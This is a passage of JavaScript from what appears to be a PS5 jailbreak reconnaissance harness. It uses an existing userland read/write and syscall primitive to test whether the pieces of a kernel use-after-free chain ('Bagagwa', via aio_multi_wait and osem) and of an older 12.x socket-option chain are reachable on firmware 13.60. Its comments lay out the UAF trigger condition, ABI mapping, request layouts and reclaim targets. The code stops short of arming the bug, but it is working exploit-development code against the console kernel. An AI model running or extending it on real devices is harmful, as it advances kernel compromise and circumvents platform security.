            var xlen = zeros(malloc(4), 4);
            window.write_buffer(xlen, new Uint8Array([0x40, 0, 0, 0]));
            var xs = pairs.length > 0
                ? S("getsockopt(victim) -- THE 12.x BUG SHAPE", 0x06A, [BigInt(pairs[0][0]), IPPROTO_IPV6, IPV6_RTHDR, xbuf, xlen], true)
                : { ret: undefined, threw: "no pair" };
            var xOk = xs.ret !== undefined && B(xs.ret) === 0n;
            out("T2c-cross", "getsockopt(victim-pipe-fd, IPV6_RTHDR) -> " + (xs.ret === undefined ? xs.threw : hex(xs.ret))
                + (xs.errName ? " (" + xs.errName + ")" : "")
                + (xOk ? " -- !! RETURNED 0 ON A NON-SOCKET: the 12.x bug shape is ALIVE on 13.60 --"
                       : " -- refused cleanly (a non-socket fd is not an IPV6 object): the cross-descriptor shape is dead here"), xOk ? "ok" : "dim");

            /* -- getrlimit: the helper both chains use -- */
            var rl = zeros(malloc(0x10), 0x10);
            var gr = S("getrlimit(RLIMIT_NOFILE)", 0x0C2, [8n, rl]);
            var grOk = gr.ret !== undefined && B(gr.ret) === 0n;
            var cur = grOk ? B(window.read64(rl)) & 0xFFFFFFFFn : 0n;
            out("T2c-getrlimit", "getrlimit(NOFILE) -> " + (gr.ret === undefined ? gr.threw : hex(gr.ret))
                + (grOk ? " (cur=" + cur + ") -- the helper both chains use answers"
                       : (gr.errName ? " (" + gr.errName + ")" : "")), grOk ? "ok" : "warn");

            /* -- verdict -- */
            var parts = [];
            if (ssOk) parts.push("RTHDR-VALIDATOR-ACCEPTED");
            if (gsOk && echoed) parts.push("TAG-ECHO");
            if (xOk) parts.push("CROSS-FD-RETURNED-0 (!!)");
            if (grOk) parts.push("getrlimit ok");
            var headline = (xOk || (ssOk && gsOk && echoed))
                ? " THE 12.x CHAIN PRIMITIVES ARE ALIVE ON " + FW + " -- worth a deeper look before Bagagwa."
                : (ssOk ? " the poison-write socket option is ACCEPTED but no 12.x bug shape reproduced: the validator passes benign pairs and still gates the bug. Both chains stay PATCHED in effect."
                        : " the 12.x surface answers but every bug shape is refused: PATCHED as expected. Every number called here is real, measured, and closed again.");
            out("T2c-VERDICT", "P2JB/poops surface called for real on " + FW + ": " + parts.join(", ") + "." + headline
                + " Nothing wrote kernel memory: sockets/pairs/kq all closed again.", "ok");
            notify("T2c: " + parts.join(",").slice(0, 46) + " | " + FW);
            chip(elVerdict, "ok", "12.x surface " + parts.length + "/4");
            nres(parts.join(",").slice(0, 40) || "all refused", "T2c");
            clean();
            return { ok: true, summary: parts.length + "/4 checks" };
        } catch (e) {
            out("T2c-VERDICT", "THREW " + String((e && e.message) || e).slice(0, 90), "err");
            nres("threw", "T2c");
            return { ok: false, summary: "threw" };
        }
    }

    /* T3b-fix, part 1: pLive's WAIT now reads states from a real buffer (arg3) so the
     * call matches the MEASURED ABI model (states is dereferenced whenever num>=1).
     * Part 2 (below): the fd labels in pLive's cleanup were INVERTED -- verified against
     * T2's pipe2 semantics (rd[0] = read end). */

    /* T3 -- the AIO family, reachability ONLY. This is the gate the whole Bagagwa chain
     * hangs on.
     *
     * aio_init is called with a benign 0 and aio_multi_wait is called ALL-ZERO: ids=NULL,
     * num=0, everything 0. num=0 cannot link a waiter list, so this cannot arm the mode-0
     * UAF -- that needs num>=2. Both upstream Bagagwa implementations use this exact
     * all-zero shape as their reachability probe, which is where the shape comes from.
     *
     * ENOSYS on aio_multi_wait means the chain is dead here and every later stage is moot.
     * The verdict therefore keys on aio_multi_wait ALONE: averaging it with aio_init would
     * print a green result on a firmware where aio_init answers but the one call the chain
     * needs is gone, which is the most expensive wrong answer this panel can give. */
    function pAio() {
        var init = S("aio_init", 0x29E, [0n], /*expectFail*/ true);
        var wait = S("aio_multi_wait(all-zero)", 0x297, [0n, 0n, 0n, 0n, 0n], /*expectFail*/ true);

        if (wait.errName === "ENOSYS") {
            out("T3-VERDICT", "BAGAGWA DEAD -- aio_multi_wait is ENOSYS on " + FW
                + (init.ok
                    ? ". aio_init DID answer, so the subsystem exists but this operation does not (patched, or capability-gated)."
                    : ". aio_init did not answer either, so the whole family is gone."), "err");
            chip(elVerdict, "bad", "aio_multi_wait ENOSYS");
            notify("bagagwa: aio_multi_wait ENOSYS on " + FW + " -- chain unreachable");
            return { ok: false, summary: "ENOSYS" };
        }
        if (wait.threw) {
            out("T3-VERDICT", "INCONCLUSIVE -- aio_multi_wait threw: " + wait.threw, "warn");
            notify("bagagwa: aio_multi_wait threw on " + FW);
            return { ok: false, summary: "threw" };
        }
        /* T0 proved the errno is kept OUTSIDE rax. ENOSYS is then indistinguishable from any
         * other refusal, and claiming "reachable" off a bare -1 would be a guess dressed as a
         * measurement -- the exact failure this panel exists to avoid. */
        if (CONV === "minus1" && wait.errName === "?") {
            out("T3-VERDICT", "CANNOT DETERMINE -- T0 established the plain -1 convention, so the "
                + "errno lives outside rax and ENOSYS cannot be told apart from any other refusal. "
                + "All this executor can give you is the raw return " + hex(wait.ret) + ". Do NOT "
                + "read this as reachable.", "warn");
            chip(elVerdict, "", "AIO reach indeterminate");
            notify("bagagwa: AIO reach indeterminate on " + FW + " (errno unreadable from rax)");
            return { ok: false, summary: "indeterminate" };
        }
        out("T3-VERDICT", "aio_multi_wait REACHABLE -- answered " + hex(wait.ret)
            + (wait.errName ? " (" + wait.errName + ")" : "") + ", NOT ENOSYS. All-zero "
            + "arguments are an invalid argument set, so a refusal here proves the SYSCALL "
            + "EXISTS and rejected them; a PATCHED kernel would have returned "
            + (CONV === "raw" ? "0x4e (inferred from the measured raw convention)"
                : CONV === "converted" ? "-78 (inferred)" : "ENOSYS")
            + " instead. The chain is reachable in principle -- this still does NOT settle "
            + "the ABI, which is what the armed call needs.", "ok");
        chip(elVerdict, "ok", "aio_multi_wait reachable");
        notify("bagagwa: aio_multi_wait reachable on " + FW);
        nres("AIO " + wait.errName + " (alive, not ENOSYS)", "reach");
        return { ok: true, summary: wait.errName || "ok" };
    }

    /* T3b -- the first tile that puts a LIVE AIO REQUEST into the kernel, still arming-safe.
     *
     * Everything before this tile called aio_multi_wait with arrays the kernel rejected or
     * could not act on. The chain itself needs requests that are LIVE AND WAITING: a waiter
     * node is only linked onto a request's waiter list while that request is in flight. This
     * tile builds exactly that, following PSAITO's verified recipe (socketpair + pending
     * MULTI_READ), and then waits on ONE of the ids with num=1.
     *
     * WHY num=1 IS THE SAFETY WALL (spelled out, this is the closest any tile gets to the bug):
     * the mode-0 corruption needs ONE node linked onto TWO OR MORE requests' waiter lists,
     * which only happens when a single aio_multi_wait call carries num >= 2 -- the walk then
     * writes node->owner once per request, so requests 0..N-2 keep pointers past cleanup.
     * num=1 links the node onto exactly ONE request, cleanup unlinks that one via
     * node->owner, and the free is paired. No call in this tile ever sets num > 1, and that
     * is enforced by the harness tripwire, not by discipline.
     *
     * Order matters: submit BEFORE wait (the requests must be pending when the wait links
     * their node), and write AFTER the wait returned -- writing first would complete the
     * reads, the requests would stop waiting, and the wait would have nothing to link.
     * Cleanup: cancel then delete with the SAME array pointer and num=1 -- leaving pending
     * AIO requests behind is itself a leak the next tile would inherit. */
    function pLive() {
        try {
            /* The safety statement is UNCONDITIONAL -- every verdict path below carries it,
             * including the early refusals, so a truncated run never loses it. */
            var SAFETY = " num=1 can never reproduce the UAF: the mode-0 corruption needs ONE node "
                + "linked onto TWO OR MORE requests' waiter lists, which only happens when a single "
                + "call carries num>=2 -- no call in this tile ever does.";
            /* socketpair(AF_UNIX, SOCK_STREAM, 0, fds) -- syscall 0x087 on 13.60 (sys_socketpair
             * per the offset maps; the 0x35 we used before is sigtimedwait and its EFAULT was
             * OUR number being wrong, not a kernel refusal). The pair
             * is the live request source: nothing is written until the end, so every
             * MULTI_READ stays pending. */
            var sfds = zeros(malloc(0x10), 0x10);
            var sp = S("socketpair(AF_UNIX,SOCK_STREAM)", 0x087, [1n, 1n, 0n, sfds]);
            if (sp.ret === undefined || B(sp.ret) !== 0n) {
                out("T3b-VERDICT", "socketpair refused (" + (sp.errName || (sp.ret === undefined ? sp.threw : hex(sp.ret)))
                    + ") -- no live request source; the chain's stage 0 starts here, so this needs settling first." + SAFETY, "warn");
                return { ok: true, summary: "no socketpair" };
            }
            var sfd = new Int32Array(window.read_buffer(sfds, 8).buffer, 0, 2);
            out("T3b-socketpair", "rfd=" + sfd[0] + " wfd=" + sfd[1] + " -- live pair; nothing written until the wake step", "dim");

            /* request structs: 0x28 bytes, read fd at +0x20 (PSAITO's MULTI_READ layout).
             * ids receives the request handles the kernel assigns at submit. */
            var NREQ = 2;
            var reqs = zeros(malloc(0x28 * NREQ), 0x28 * NREQ);
            for (var ri = 0; ri < NREQ; ri++) {
                window.write_buffer(reqs + BigInt(ri * 0x28 + 0x20), new Uint8Array([sfd[0] & 0xff, (sfd[0] >> 8) & 0xff, 0, 0, 0, 0, 0, 0]));
            }
            var ids = zeros(malloc(0x10), 0x10);
            var sub = S("aio_submit_cmd(MULTI_READ,n=2,prio=3)", 0x29D, [0x1001n, reqs, 2n, 3n, ids]);
            if (sub.ret === undefined || B(sub.ret) !== 0n) {
                out("T3b-VERDICT", "aio_submit_cmd refused (" + (sub.errName || (sub.ret === undefined ? sub.threw : hex(sub.ret)))
                    + ") -- the request layout (0x28, fd@+0x20) or the cmd/priority encoding is wrong; "
                    + "this is the stage the writeup never fully documents, and it is measurable without arming." + SAFETY, "warn");
                S("close w", 0x006, [BigInt(sfd[0])]);
                S("close r", 0x006, [BigInt(sfd[1])]);
                return { ok: true, summary: "submit refused" };
            }
            var id0 = window.read64(ids), id1 = window.read64(ids + 8n);
            out("T3b-submit", "ok -- 2 pending MULTI_READ requests, ids=[" + hex(B(id0)) + ", " + hex(B(id1)) + "]", "ok");

            /* THE wait -- one id, num=1, and a REAL states buffer: the measured ABI model
             * says states (arg3) is dereferenced whenever num>=1, so passing 0 here would
             * tell us about EFAULT, not about the wait itself. Zero-filled states are safe:
             * a wait on an incomplete request returns before any state is written. */
            var stbuf = zeros(malloc(0x40), 0x40);          /* room for one 0x38 io_state */
            var w = S("aio_multi_wait(ids[0], num=1)", 0x297, [ids, 1n, stbuf, 0n, 0n]);
            out("T3b-wait", "aio_multi_wait(ids, num=1) -> " + (w.ret === undefined ? w.threw : hex(w.ret))
                + (w.errName ? " (" + w.errName + ")" : "")
                + " -- num=1 can never reproduce the UAF (that needs num>=2 in ONE call)", "dim");

            /* Wake: complete the pending reads so nothing stays armed behind us.
             * sched_yield settle after: same kernel-worker timing argument as pArm. */
            var one = malloc(0x10);
            window.write_buffer(one, new Uint8Array([0x41]));
            S("write(wfd,1)", 0x004, [BigInt(sfd[1]), one, 1n]);
            settle(100);

            /* Cleanup: cancel then delete with the SAME pointer, num=1, and a REAL states
             * buffer (PSAITO 3-arg shape: states is dereferenced at num>=1; the old
             * hardwired 0 would EFAULT and leave the requests behind). */
            var stClean = zeros(malloc(0x20), 0x20);
            var c = S("aio_multi_cancel(ids,1,states)", 0x29A, [ids, 1n, stClean], true);
            var d = S("aio_multi_delete(ids,1,states)", 0x296, [ids, 1n, stClean], true);
            S("close w", 0x006, [BigInt(sfd[1])]);   /* fd labels verified against T2's pipe2: sfd[0] is the read end */
            S("close r", 0x006, [BigInt(sfd[0])]);

            out("T3b-VERDICT", "LIVE-REQUEST REACHABILITY MEASURED on " + FW + ": socketpair ok, submit ok (2 pending reads), "
                + "multi_wait(num=1) answered " + (w.ret === undefined ? w.threw : hex(w.ret)) + (w.errName ? " (" + w.errName + ")" : "")
                + ", cancel=" + (c.ret === undefined ? c.threw : hex(c.ret)) + (c.errName ? " (" + c.errName + ")" : "")
                + ", delete=" + (d.ret === undefined ? d.threw : hex(d.ret)) + (d.errName ? " (" + d.errName + ")" : "")
                + ". This settles what the armed call will see: whether ids from submit are raw handles "
                + "(wait ESRCH-free) or need an indirection, and which of mode/timeout positions the "
                + "kernel accepts. What it can NEVER do is arm the UAF -- every call here had num<=1, "
                + "and the corruption needs num>=2 in ONE call. That step stays behind your explicit go.", "ok");
            notify("bagagwa T3b live request: wait=" + (w.ret === undefined ? "threw" : hex(w.ret)) + " on " + FW);
            chip(elVerdict, "ok", "live request ok (num=1)");
            nres("live req ok: wait=" + (w.ret === undefined ? "threw" : hex(w.ret)) + (w.errName ? " " + w.errName : ""), "T3b");
            return { ok: true, summary: "live request measured" };
        } catch (e) {
            out("T3b-VERDICT", "THREW " + String((e && e.message) || e).slice(0, 90) + " -- if a pending request outlived this tile, a console REBOOT (not reload) clears it", "err");
            return { ok: false, summary: "threw" };
        }
    }

    /* T6 -- the aio_multi_wait ABI map. Read-only, and ARMING-SAFE BY CONSTRUCTION.
     *
     * Three implementations disagree on this call's argument order -- Bagagwa_chain uses
     * (instanceId, ids, num, mode), slopkit_ref/PSAITO use (ids, num, ...) -- and a wrong
     * order fails SILENTLY: mode lands in the wrong register, the shared node is never
     * linked onto the requests' waiter lists, the array is never freed, and the call still
     * RETURNS CLEANLY. That reads as "the kernel is patched" when the truth is "we called it
     * wrong", which is why the order has to be MEASURED before anything is armed.
     *
     * THE SAFETY ARGUMENT, spelled out because this is the tile that gets closest to the bug.
     * The mode-0 corruption needs ONE node linked onto TWO OR MORE requests' waiter lists,
     * which requires BOTH (a) a valid ids array the kernel actually walks AND (b) num >= 2.
     * Every call below sets AT MOST TWO registers nonzero:
     *     reg[i] = pointer to a zero-filled buffer
     *     reg[j] = 1
     * with all four others left at 0. Let the kernel's real ids register be I and its real num
     * register be N. Then:
     *   * N not in {i,j} -> num = 0   -> rejected before anything is linked
     *   * N = j          -> num = 1   -> at most ONE request linked, so there is no second
     *                                   list for a node to be shared with and nothing can
     *                                   dangle; cleanup unlinks by node->owner and finds it
     *   * N = i          -> num = the buffer address, and ids is arg j = 1 or a register left
     *                                   at 0 -- both unmapped user pages, so the FIRST ids
     *                                   read faults and the walk aborts before any link
     *                                   (I != N, so I can only be j or a zeroed register)
     * There is NO assignment of (i, j) that reaches a valid array with num >= 2, and phase 1
     * is the same argument with reg[j] left at 0. tools/test_abimap.mjs asserts this as a
     * tripwire: its kernel model latches `armed` on any valid-array-with-num>=2 call and the
     * suite fails if it ever fires.
     *
     * WHAT IT CANNOT DO: it cannot pin `mode` or `timeout`, and it never passes a real request
     * id, so it cannot prove the shared-node path works -- only what the argument ORDER is.
     */
    function pAbiMap() {
        var REGNAME = ["rdi (arg 1)", "rsi (arg 2)", "rdx (arg 3)", "rcx->r10 (arg 4)", "r8 (arg 5)", "r9 (arg 6)"];
        var buf, base;
        try {
            buf = zeros(malloc(0x70), 0x70);
        } catch (e) {
            out("ABI-VERDICT", "cannot allocate the array buffer: " + String((e && e.message) || e).slice(0, 80), "err");
            return { ok: false, summary: "no buffer" };
        }
        function only(k, v) { var a = [0n, 0n, 0n, 0n, 0n, 0n]; a[k] = v; return a; }
        function pair(i, vi, j, vj) { var a = [0n, 0n, 0n, 0n, 0n, 0n]; a[i] = vi; a[j] = vj; return a; }
        function nm(r) { return r.ret === undefined ? "threw" : (r.errName || hex(r.ret)); }

        base = S("ABI baseline (all zero)", 0x297, [0n, 0n, 0n, 0n, 0n, 0n], true);
        if (base.ret === undefined) {
            out("ABI-VERDICT", "the all-zero baseline threw (" + base.threw + ") -- nothing to compare against", "err");
            return { ok: false, summary: "baseline threw" };
        }
        var e0 = B(base.ret);   // the all-zero baseline, printed alongside phase 1

        /* Phase 1 -- ONE register at a time, pointer-shaped sentinel. 0x1000 is an unmapped
         * user page, so if the kernel dereferences that argument as the array the copyin
         * fails and the return MOVES to EFAULT; if the argument is a scalar it either
         * validates (a different errno) or is not read at all (baseline unchanged). */
        var deref = [], row1 = [];
        for (var k = 0; k < 6; k++) {
            var r = S("ABI arg" + (k + 1) + "=" + hex(0x1000n), 0x297, only(k, 0x1000n), true, true);
            var fault = r.errName === "EFAULT";
            if (fault) deref.push(k);
            row1.push("arg" + (k + 1) + "=" + nm(r));
        }
        out("ABI-phase1", "one register at a time (others 0)  baseline=" + nm(base) + " (" + hex(e0) + ")"
            + "  |  " + row1.join("  "), "dim");

        /* Phase 2 -- the VALID array in one argument and num=1 in another, so the kernel gets
         * past any num==0 short-circuit and reveals which pair it consumes. Still at most two
         * nonzero registers, so the safety argument above holds. */
        var M = [], rows = [];
        for (var i = 0; i < 6; i++) {
            M.push([]);
            var cells = [];
            for (var j = 0; j < 6; j++) {
                if (i === j) { M[i].push(null); cells.push("  --  "); continue; }
                var rr = S("ptr@arg" + (i + 1) + " num1@arg" + (j + 1), 0x297, pair(i, buf, j, 1n), true, true);
                if (rr.threw === "executor dead") { out("ABI-VERDICT", "executor latched dead mid-sweep", "err"); return { ok: false, summary: "wedge" }; }
                var n = nm(rr);
                M[i].push(n);
                cells.push(n);
            }
            rows.push("  arg" + (i + 1) + "=arrayptr : " + cells.join(" "));
        }
        out("ABI-phase2", "rows = the argument holding the array pointer, columns = arg1..arg6", "dim");
        for (var z = 0; z < rows.length; z++) out("ABI-matrix", rows[z], "dim");

        /* COLUMN MODEL (hardware 13.60, 20:13 run): the row-wise scan below reported
         * INCONCLUSIVE on the real matrix -- but the matrix decodes EXACTLY once read
         * column-wise, and the decode is stricter than "EFAULTs concentrate in one column".
         * The four EFAULT cells all sit in the arg2 column, and in ALL of them the value in
         * arg2 was 1 -- i.e. num=1 is what ACTIVATED the derefs. Meanwhile row arg2 (which
         * put the huge buffer value in num) stayed EINVAL, and row arg4 (huge value in what
         * PSAITO calls mode) stayed EINVAL. The model that accounts for every cell:
         *
         *   num == 0              -> EINVAL before anything is touched      (25 cells)
         *   num huge (buffer ptr) -> EINVAL: a num DOMAIN check exists      (row arg2)
         *   mode invalid          -> EINVAL: checked before the derefs      (row arg4)
         *   num = 1               -> ids/states are dereferenced; our sweep sets only ONE
         *                            pointer per call, so ids or states was always NULL
         *                            and the call faulted                    (4 cells)
         *
         * The num-domain fact is what phase 1 needed all along: 0x1000 in the num slot is
         * merely a large num, which the domain check rejects with EINVAL -- phase 1 could
         * never fault there, and its all-EINVAL sweep is PREDICTED by this model, not a
         * failure to probe. This is PSAITO's documented (ids, num, states, mode, timeout)
         * pair, measured independently on 13.60. */
        var fc = -1, fcn = 0, fcRows = [];
        for (var cj = 0; cj < 6; cj++) {
            var fn = 0, fr = [];
            for (var ri = 0; ri < 6; ri++) if (ri !== cj && M[ri][cj] === "EFAULT") { fn++; fr.push(ri); }
            if (fn > fcn) { fcn = fn; fc = cj; fcRows = fr; }
        }
        /* The fc column must be EFAULT-or-EINVAL with EFAULT in >=2 rows, and EVERY row must
         * be one of exactly two shapes: EFAULT in column fc and EINVAL elsewhere (a row whose
         * array slot is genuinely dereferenced), or uniform EINVAL (its slot received the
         * buffer value and the kernel VALIDATED rather than dereferenced it -- on the real
         * matrix those rows are arg2 itself, the num row, and arg4, the mode row. Those
         * uniform rows are not noise; they are the positive evidence for the domain/mode
         * checks, and the first draft of this criterion wrongly rejected them). */
        var modelOK = fcn >= 2 && fc >= 0;
        var uniformRows = [];
        for (var ri = 0; ri < 6 && modelOK; ri++) {
            var faultAtFc = (ri !== fc) && M[ri][fc] === "EFAULT";
            var othersOK = true, uniformRow = true;
            for (var cj = 0; cj < 6; cj++) {
                if (ri === cj) continue;
                if (M[ri][cj] !== "EINVAL") uniformRow = false;
                if (cj !== fc && M[ri][cj] !== "EINVAL") othersOK = false;
            }
            if (faultAtFc) { if (!othersOK) modelOK = false; }
            else if (!uniformRow) modelOK = false;
            else uniformRows.push(ri);
        }

        /* Keep the row-wise scan as the fallback for a kernel whose rejection order
         * differs: for a FIXED array argument, num is 0 in every cell but one, so the
         * true ids row is the row where a single non-EFAULT column stands apart. */
        var cands = [];
        if (!modelOK) {
            for (var ri = 0; ri < 6; ri++) {
                var tally = {}, order = [];
                for (var cj = 0; cj < 6; cj++) {
                    var v = M[ri][cj];
                    if (v === null || v === undefined) continue;
                    if (!(v in tally)) { tally[v] = 0; order.push(v); }
                    tally[v]++;
                }
                if (order.length !== 2) continue;                    // uniform row: not ids
                var a = order[0], b = order[1];
                var odd = tally[a] === 1 ? a : (tally[b] === 1 ? b : null);
                if (!odd || odd === "EFAULT" || tally[odd] !== 1) continue;
                for (var oj = 0; oj < 6; oj++)
                    if (oj !== ri && M[ri][oj] === odd) cands.push({ i: ri, j: oj, nm: odd, mode: tally[a] === 1 ? b : a });
            }
        }

        out("ABI-safety", "arming-safe by construction: at most two registers are nonzero per call, "
            + "so the real num is 0, 1, or the buffer address -- and whenever it is the buffer "
            + "address the ids register is 0 or 1, both unmapped, so the walk faults before any "
            + "link can be made. A valid array is never paired with num >= 2.", "dim");

        if (modelOK) {
            /* Derived, not hardcoded: the uniform rows are the slots the kernel VALIDATES
             * instead of dereferencing; on the real matrix they are arg2 (num -- a domain
             * check) and arg4 (mode). The states-deref fact comes from row arg1: a VALID ids
             * still faulted with num=1, so the OTHER pointer (states) is dereferenced too. */
            var uni = uniformRows.map(function (r) { return "arg" + (r + 1); }).join("/");
            var domainClaim = (uniformRows.indexOf(fc) >= 0)
                ? " row arg" + (fc + 1) + " put a huge value in num and stayed EINVAL -- a num DOMAIN check exists, which is also why phase 1's 0x1000-in-num could never fault;"
                : "";
            var statesClaim = (fc >= 0 && M[0] && M[0][fc] === "EFAULT")
                ? " (row arg1 col" + (fc + 1) + " had a VALID ids and still faulted: states@arg3=NULL faulted, so states is dereferenced too)"
                : "";
            out("ABI-VERDICT", "ids = argument 1 [" + REGNAME[0] + "], num = argument " + (fc + 1)
                + " [" + REGNAME[fc] + "] -- MEASURED on this console, not inherited. The model "
                + "accounts for all 30 cells: num==0 -> EINVAL before any deref (25 cells); the four "
                + "EFAULTs all have num=1, which is what ACTIVATES the derefs -- and because this "
                + "sweep sets only ONE pointer per call, ids or states was always NULL in them"
                + statesClaim + ";" + domainClaim
                + " rows " + uni + " stayed EINVAL under the buffer value -- validated, not "
                + "dereferenced (mode among them). Phase 1's all-EINVAL is PREDICTED by the same "
                + "model, not a failure to probe. Matches PSAITO's documented "
                + "(ids, num, states, mode, timeout) pair, measured here independently on " + FW + ". "
                + "NOT yet measured: which of ids/states is checked first, mode/timeout positions, "
                + "and the id encoding -- those need live requests.", "ok");
            notify("bagagwa ABI 13.60: ids=arg1 num=arg2 (measured, 30/30 cells)");
            nres("ABI measured: ids=arg1 num=arg" + (fc + 1), "ABI");
            return { ok: true, summary: "ids=arg1 num=arg" + (fc + 1) + " (measured)" };
        }
        if (cands.length === 1) {
            var w = cands[0];
            /* Phase 1 finds whichever argument is checked LAST before the array is read, and
             * that is not always the array itself -- see the two corroborations below. Saying
             * which end a phase observed is the difference between corroboration and a claim. */
            var corrob = "";
            if (deref.length === 1 && deref[0] === w.i)
                corrob = " Phase 1 corroborates from the other direction: 0x1000 in argument " + (w.i + 1)
                    + " alone flipped the return to EFAULT, i.e. that IS the argument the kernel dereferences.";
            else if (deref.length === 1 && deref[0] === w.j)
                corrob = " Phase 1 corroborates from the OTHER END: its only EFAULT came from argument " + (w.j + 1)
                    + ", the argument the sweep calls num. A bad pointer there is merely a large num, which gets "
                    + "past the num==0 rejection and lets the ARRAY check be the thing that faults -- so both "
                    + "phases point at the same pair from opposite sides.";
            else if (deref.length > 1)
                corrob = " Phase 1 could not isolate anything (all " + deref.length + " arguments faulted when given "
                    + "0x1000, because an absent array faults too), so this rests on the sweep alone.";
            else if (deref.length === 1)
                corrob = " Phase 1 pointed at argument " + (deref[0] + 1) + " instead, which does not line up with "
                    + "this pair -- treat the sweep result as unconfirmed.";
            out("ABI-VERDICT", "ids = argument " + (w.i + 1) + " [" + REGNAME[w.i] + "], num = argument "
                + (w.j + 1) + " [" + REGNAME[w.j] + "]. Row " + (w.i + 1) + " is the only one where a single "
                + "column stands apart ('" + w.nm + "' vs '" + w.mode + "' in the other four), which is "
                + "what a nonzero num looks like when num is 0 in every other cell of that row."
                + corrob + " Inference from one sweep, not a table lookup.", cands[0] && corrob.indexOf("unconfirmed") < 0 ? "ok" : "warn");
            notify("bagagwa ABI: ids=arg" + (w.i + 1) + " num=arg" + (w.j + 1) + " (" + w.nm + ")");
            return { ok: true, summary: "ids=arg" + (w.i + 1) + " num=arg" + (w.j + 1) };
        }
        if (cands.length > 1) {
            out("ABI-VERDICT", cands.length + " rows each have a single odd column ("
                + cands.map(function (x) { return "arg" + (x.i + 1) + "=array+arg" + (x.j + 1) + "=num -> " + x.nm; }).join("; ")
                + ") -- more than one argument pair behaves like (array, num), most likely because the "
                + "kernel dereferences another argument too. Do NOT pick one from this alone.", "warn");
            return { ok: false, summary: "ambiguous" };
        }
        if (deref.length === 1) {
            out("ABI-VERDICT", "argument " + (deref[0] + 1) + " [" + REGNAME[deref[0]] + "] is the argument the "
                + "kernel DEREFERENCES last -- 0x1000 there alone reached EFAULT while every other "
                + "single-argument change left the return at " + nm(base) + ". On an ids-first kernel that IS "
                + "the ids array, but a bad pointer in a count slot would equally get past a num==0 rejection "
                + "and let the array check fault, so this does not order the pair by itself, and the sweep "
                + "produced no row to cross-check it. Do not arm on this.", "warn");
            return { ok: false, summary: "array only" };
        }
        out("ABI-VERDICT", "INCONCLUSIVE. No single-argument change produced EFAULT, no column concentrates "
            + "the faults, and no row has a single odd column relative to its own baseline " + nm(base)
            + " -- the kernel rejects this argument set before it touches anything we varied. It may want "
            + "an instance handle, or a num domain we have not guessed. The matrix above is the raw "
            + "evidence; do NOT arm on a guess.", "warn");
        notify("bagagwa: ABI map inconclusive on " + FW);
        return { ok: false, summary: "inconclusive" };
    }

    /* T4 -- osem. Bagagwa's conversion targets osem's 32-bit refcount at +0x54, the same
     * width as the AIO decrement, so if osem is unreachable too the chain has no target.
     *
     * THE ABI HERE IS NOT SETTLED, and the difference is not cosmetic. Bagagwa_chain calls
     * (name, attr); PSAITO's bagagwa_uaf_1320.js calls the FIVE-argument
     * (name, 0, 1, 1, 0). We originally sent (name, attr) -- two arguments, which zero-fills
     * the rest to (name, ptr, 0, 0, 0). If those two 1s are a required mode/type pair, then
     * the 0x16 the first 13.60 run recorded was OUR bad call, not a kernel refusal, and
     * reading it as "osem is patched" would have been exactly the class of mistake this
     * panel exists to prevent. So try the documented shape first, fall back to ours, and
     * report which one answered.
     *
     * The create return is AMBIGUOUS on its own: under the raw convention a small positive
     * rax is either a handle or an errno, and 0x16 = 22 could be either. The follow-ups
     * settle it -- a GENUINE handle does not give ESRCH on close -- so a shape is accepted
     * only when close() returns 0, never on the strength of the create return. */    function pOsem() {
        try {
            /* The name is also unmeasured: alloc_string embeds the string in OUR address
             * space, and osem_create may expect a COPY of the name (which needs a second
             * buffer) or treat the argument as something else entirely. If a shape refuses
             * under both name forms, the name contract is the next suspect -- the log says
             * which form each number came from. */
            var name = window.alloc_string("bwp_probe");
            var nameCopy = zeros(malloc(0x20), 0x20);
            var nb = new Uint8Array(10), ns = "bwp_probe";
            for (var ni = 0; ni < ns.length; ni++) nb[ni] = ns.charCodeAt(ni);
            nb[9] = 0; /* NUL-terminated copy, no TextEncoder dependency */
            window.write_buffer(nameCopy, nb);
            var attr = zeros(malloc(0x20), 0x20);
            var SHAPES = [
                { tag: "osem_create(name,0,1,1,0)", args: [name, 0n, 1n, 1n, 0n], from: "PSAITO 13.20" },
                { tag: "osem_create(nameCopy,0,1,1,0)", args: [nameCopy, 0n, 1n, 1n, 0n], from: "PSAITO 13.20 + copied name" },
                { tag: "osem_create(name,attr,0,0,0)", args: [name, attr, 0n, 0n, 0n], from: "Bagagwa_chain" },
            ];
            var tried = [];

            /* Handle-or-errno, by RANGE first. The cutoff is 0x80, from real hardware: the
             * 20:13 run returned 0xa6 and osem_delete(0xa6) -> 0 while delete(0x16) -> ESRCH,
             * so 0xa6 behaved like a LIVE OBJECT, not an errno (and the later run returned
             * 0xa6 then 0xa7 for successive creates -- an allocator handing out handles, not
             * a static errno table; PS4/PS5 errno values top out near 0x4e = ENOSYS anyway).
             * The first 0x80 cutoff here was too wide and masked a likely-real handle. A rax
             * at or above the cutoff is a HANDLE CANDIDATE and must be PROVEN by the epilogue
             * below; below it is an errno and is never sent to open/close/delete. */
            var HANDLE_MIN = 0x80n;
            for (var si = 0; si < SHAPES.length; si++) {
                var cr = S(SHAPES[si].tag, 0x225, SHAPES[si].args);
                if (cr.ret === undefined) { tried.push(SHAPES[si].tag + "=threw"); continue; }
                var h = cr.ret;
                tried.push(SHAPES[si].tag + "=" + hex(h));
                if (h === 0n || h >= HANDLE_MIN) {
                    /* EPILOGUE, delete-first: osem_delete is the one call that returns 0 on a
                     * REAL handle (it runs the refcount to zero and frees) and ESRCH on a bad
                     * one -- and it takes the object OUT of the namespace, which is also the
                     * safe order: close-then-delete on a genuine handle is the documented
                     * DOUBLE-FREE (close frees at refcount 0, delete frees again). On a fake
                     * handle both refuse and nothing is leaked. Close is attempted only when
                     * delete did not consume the object. */
                    var d = S("osem_delete", 0x226, [h]);
                    var dret = (d.ret !== undefined) ? B(d.ret) : -1n;
                    if (dret === 0n) {
                        out("T4-create", "handle=" + hex(h) + " via '" + SHAPES[si].tag + "' (" + SHAPES[si].from
                            + ") -- PROVEN: osem_delete returned 0 (real handle, consumed)", "ok");
                        out("T4-VERDICT", "osem_create returned a REAL handle: " + hex(h) + " via "
                            + SHAPES[si].tag + " [" + SHAPES[si].from + "] -- osem_delete accepted it and "
                            + "returned 0. Kernel-side allocation in the 128 zone works from our executor; "
                            + "that is the prerequisite for Bagagwa's reclaim stage. Note 0x" + h.toString(16)
                            + " is far above the errno band, and the create rax was never the proof -- the "
                            + "epilogue was.", "ok");
                        notify("bagagwa T4 osem REAL HANDLE via " + SHAPES[si].tag);
                        chip(elVerdict, "ok", "osem target reachable");
                        nres("osem REAL HANDLE " + hex(h) + " (delete==0)", "osem");
                        return { ok: true, summary: "handle via " + SHAPES[si].tag };
                    }
